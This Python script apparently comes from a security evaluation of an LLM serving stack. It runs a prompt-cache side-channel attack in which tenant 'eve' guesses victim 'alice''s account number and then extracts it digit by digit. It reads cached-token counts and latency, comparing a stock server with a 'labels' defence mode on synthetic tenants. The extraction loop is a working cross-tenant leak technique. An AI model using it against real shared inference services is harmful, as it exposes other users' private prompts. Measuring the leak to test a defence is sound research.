#!/usr/bin/env python3
"""Record every probe of one guess trial and one extraction trial, stock vs labels.

The summary attacks (run_pod.py) keep only accuracies. This keeps each probe's
cached-token count and latency, for figures: which candidate came back
fastest, and how the cached count rises digit by digit.

    python attack/transcript.py [--model Qwen/Qwen3-8B]

Needs scripts/pod/setup.sh first. Writes .pod/transcript.json. Synthetic
tenants, our own server only.
"""

from __future__ import annotations

import argparse
import json
import random
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path[:0] = [str(ROOT), str(ROOT / "engine")]

from attack import harness  # noqa: E402
from attack.run_pod import STATE, load_check  # noqa: E402
from ifabsec_engine.devmint import chat_token  # noqa: E402


def guess_trial(server, model, mint, k=20, seed=7):
    rng = random.Random(seed)
    harness._flush(server)
    system = harness._system(rng)
    ids = [f"{n:06d}" for n in rng.sample(range(10**6), k)]
    secret = rng.choice(ids)
    harness._send(server, model, mint, "alice", "acme", system, f"Account {secret}. {harness.FORM}")
    for i in range(3):
        harness._send(server, model, mint, "eve", "acme", system, f"Warmup {i}.")
    order = ids[:]
    rng.shuffle(order)
    probes = []
    for c in order:
        p = harness._send(server, model, mint, "eve", "acme", system, f"Account {c}. {harness.FORM}")
        probes.append({"candidate": c, "is_secret": c == secret, "cached": p.cached,
                       "prompt_tokens": p.prompt_tokens, "latency_ms": round(p.latency * 1000, 2)})
    return {"secret": secret, "probes": probes}


def extract_trial(server, model, mint, digits=6, seed=11):
    rng = random.Random(seed)
    harness._flush(server)
    system = harness._system(rng)
    account = "".join(rng.choice("0123456789") for _ in range(digits))
    alice = harness._send(server, model, mint, "alice", "acme", system,
                          f"My account number is {account}. Please check my balance.")
    known, steps = "", []
    for pos in range(digits):
        row = {}
        for d in "0123456789":
            p = harness._send(server, model, mint, "eve", "acme", system, f"My account number is {known}{d}")
            row[d] = p.cached or 0
        top = max(row.values())
        best = [d for d in row if row[d] == top]
        steps.append({"position": pos + 1, "true_digit": account[pos], "cached_by_digit": row,
                      "picked": best[0] if len(best) == 1 else None})
        if len(best) != 1:
            break
        known += best[0]
    return {"account": account, "alice_prompt_tokens": alice.prompt_tokens, "recovered": known, "steps": steps}


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--model", default="Qwen/Qwen3-8B")
    ap.add_argument("--port", type=int, default=30000)
    a = ap.parse_args()
    if not (STATE / "env").exists():
        print("run scripts/pod/setup.sh first", file=sys.stderr)
        return 2
    env = dict(line.split("=", 1) for line in (STATE / "env").read_text().split())
    seed = bytes.fromhex((STATE / "gw.seed").read_text().strip())
    kid, aud = env["IFAB_GATEWAY_KEYS"].split(":", 1)[0], env["IFAB_AUDIENCE"]

    def mint(user, org, shared):
        return chat_token(seed, kid=kid, aud=aud, user=user, org=org, shared_messages=shared)

    check = load_check()
    out = {"model": a.model}
    for mode, server_env in (("stock", {"IFAB_MODE": "off"}), ("labels", env)):
        server = check.Server(a.model, a.port, server_env, STATE / f"server-transcript-{mode}.log")
        try:
            server.wait()
            out[mode] = {"guess": guess_trial(server, a.model, mint), "extract": extract_trial(server, a.model, mint)}
        finally:
            server.stop()
        g, e = out[mode]["guess"], out[mode]["extract"]
        fastest = min(g["probes"], key=lambda p: p["latency_ms"])
        print(f"== {mode}: secret {g['secret']}, fastest probe {fastest['candidate']} "
              f"({'right' if fastest['is_secret'] else 'wrong'}); account {e['account']}, recovered '{e['recovered']}'")
        for s in e["steps"]:
            print(f"   digit {s['position']} (true {s['true_digit']}): " +
                  " ".join(f"{d}:{c}" for d, c in s["cached_by_digit"].items()))
    (STATE / "transcript.json").write_text(json.dumps(out, indent=2))
    print(f"\nresults: {STATE / 'transcript.json'}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
